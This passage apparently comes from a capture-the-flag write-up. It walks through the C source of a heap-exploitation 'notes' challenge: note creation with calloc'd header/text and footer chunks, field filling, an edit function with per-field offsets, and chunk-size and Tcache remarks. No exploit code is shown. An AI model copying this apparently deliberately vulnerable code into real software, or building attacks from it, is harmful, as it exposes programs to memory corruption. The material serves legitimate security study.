<span class="mtk1">        </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk1">sz</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">default</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid note size!!"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">with_footer</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Do you want to write a footer to your note? [yes:</span><span class="mtk4"> 1, no: 0]"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">with_footer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">switch</span><span class="mtk1"> (</span><span class="mtk1">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk5">default</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid choize!!"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_written</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">true</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">size</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">note_sz</span><span class="mtk1">) </span><span class="mtk1">sz</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">total_text_tam</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">TAM_TEXT</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">sz</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">, </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">calloc</span><span class="mtk1">(</span><span class="mtk1">total_text_tam</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">calloc</span><span class="mtk1">(</span><span class="mtk8">TAM_FOOTER</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Filling the fields..."</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fill_fields</span><span class="mtk1">(</span><span class="mtk1">idx</span><span class="mtk1">, </span><span class="mtk1">with_footer</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the note's text"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk1">total_text_tam</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Note created with index </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk1">idx</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>This function asks the following questions:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">What would you like to do?
[0] Create new note.
[1] Edit existing note.
[2] Read existing note.
[3] Throw note to the bin.
[4] Exit.
&gt;0
Select the note's index
[ 0 1 2 3 ]
&gt;0
Choose the note size [small: 0, med: 1, big: 2]
&gt;0
Do you want to write a footer to your note? [yes: 1, no: 0]  
&gt;1

Filling the fields...
Enter the author's name:
&gt;asdf
Enter the author's surname:
&gt;asdf
Enter the date:
&gt;asdf
Enter the city:
&gt;asdf
Enter the note's text
&gt;asdfasdfasdf
Note created with index 0
</code></pre></div><p>First, it checks that there is space in the 4 slots we have. Then ,it asks about the index to save the note. Later, it requests the size of the note and if it will have footer:</p><ul><li>Small: <code>0x410</code> bytes</li><li>Medium: <code>0x420</code> bytes</li><li>Big: <code>0x430</code> bytes</li><li>With footer: <code>0x18</code> additional bytes</li></ul><p>Note that on the one hand there is the header and the text (as one chunk), and on the other the footer (like a <code>0x20</code>-sized chunk). In both cases, <code>calloc</code> is used, which initializes the content of the chunk to zero and also does not use the Tcache free-lists.</p><p>The information of the note is managed by the function <code>fill_fields</code>, that is well implemented:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span>
<span class="mtk8">fill_fields</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">idx</span><span class="mtk1">, </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk9 mtki">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the author's name:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">strncpy</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>  
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the author's surname:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk5">+</span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk5">+</span><span class="mtk1">text_offset</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">strncpy</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the date:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk5">+</span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk5">+</span><span class="mtk1">text_offset</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">with_footer</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">strncpy</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the city:"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk9 mtki">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk1">text_offset</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">text_offset</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="edit-function">Edit function</h3><p>The <code>edit_note</code> function is as follows:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span>
<span class="mtk8">edit_note</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What is the index of the note you want to edit?"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">print_note_idxs</span><span class="mtk1">();</span>
<span class="mtk1">        </span>
<span class="mtk1">        </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk8">MAX_NOTES</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_written</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid note!!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">edit_footer</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Do you want to edit the text a footer field or a </span><span class="mtk4">header field? [text: 0, footer: 1, header: 2]"</span><span class="mtk1">);</span>  
<span class="mtk1">        </span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid choize!!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_text</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"The text has already been edited. You don't have </span><span class="mtk4">any tipex left!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_footer</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"The footer has already been edited. You don't hav</span><span class="mtk4">e any tipex left!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_header</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"The header has already been edited. You don't hav</span><span class="mtk4">e any tipex left!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What field have you messed up? [Name: 0, Surname:</span><span class="mtk4"> 1, Date: 2]"</span><span class="mtk1">);        </span>
<span class="mtk1">            </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">){</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That field doesn't exist!!"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_footer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">true</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">footer</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the new field value"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">buf</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">buf</span><span class="mtk1">);</span>

<span class="mtk1">    }</span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">edit_footer</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"What field have you messed up? [Name: 0, Surname:</span><span class="mtk4"> 1, Date: 2, City: 3]"</span><span class="mtk1">);        </span>
<span class="mtk1">            </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">){</span>
<span class="mtk1">                </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That field doesn't exist!!"</span><span class="mtk1">);</span>
<span class="mtk1">                </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_header</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">true</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">field</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">buf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the new field value"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">buf</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">clean_whitespaces</span><span class="mtk1">(</span><span class="mtk1">buf</span><span class="mtk1">);</span>

<span class="mtk1">    }</span><span class="mtk5">else</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">has_been_edited_text</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">true</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">header_sz</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">note_tam</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8">TAM_TEXT</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">size</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">header_sz</span><span class="mtk1">;</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter the new text"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">read_text_input</span><span class="mtk1">(</span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">header_sz</span><span class="mtk1">, </span><span class="mtk1">note_tam</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Changes applied!"</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
